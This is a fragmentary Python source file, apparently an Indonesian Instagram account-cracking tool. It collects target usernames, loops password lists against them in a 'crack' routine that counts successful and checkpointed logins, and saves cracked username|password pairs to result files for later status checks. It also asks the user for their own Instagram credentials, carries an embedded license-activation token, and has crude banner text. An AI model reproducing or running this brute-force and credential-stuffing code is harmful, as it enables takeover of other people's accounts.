...
# USN="Mozilla/5.0 (Linux; Android 12; SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
...
def banner():
    clear()
    wel = '# SELAMAT DATANG CALON PENGHUNI NERAKA '
    wel2 = mark (wel, style='yellow')
    sol().print(wel2)
  #  au='AUTHOR    :  Mboh Raroh     
...
def login():
    global external
    try:
        wel = '# Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan kontol'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        us=input(f"{H}[•] Masukan username: {C}")
        pw=stdiomask.getpass(prompt=f'{H}[•] Masukan password: {C}')
    ...
    def logo(self):
        for i in external:
            try:
                ...
                pass
            banner()
            welcome=f'''{H}[{M}•{H}]Selamat Datang : {C}Atta Halilintar - PAPATA{H}
[{M}•{H}]Username       : {C}attahalilintar{H}
[{M}•{H}]Followers      : {C}24389398{H}
[{M}•{H}]Following      : {C}5309{C}'''
    ...
    def generateAPI(self,user,o,zx=''):
        ...
        oi = nel(io, style='green')
        cetak(nel(oi, title='PROSES CRACK BERJALAN'))
    ...
    def crackAPI(self,user,pas):
        ...
        sys.stdout.write(f"\r{H}┣[🥱] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "),sys.stdout.flush()
        try:
            for pw in pas:
...
#					self.crackAPI(user,pas)
    ...
    def menu(self):
        ...
        if c=='':
            ...
            for i in range(m):
                i+1
                nama=input(f'{H}┣[>] Masukan nama ({H}{len(internal)}{C}): ')
            ...
            for i in os.listdir('result'):
                print(f' [{U}>{C}] {i}')
            c=input(f'\n {H}┣>>> Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            print(f'\n{H}┣[+] Total Result MASTER_FU{H}{len(g)}{C}')
            print(f'\n{H}┣[!] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
...
def lisensi():
    ...
    res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyNjA0Njc5NyIsIndPay9IcUZsMEJCTVZkdmdlMmFQalo0L3BpeHp0cDVQdlY3cE1OM2giXQ==&ProductId=16881&Key='+lisensikuni[0]).json()
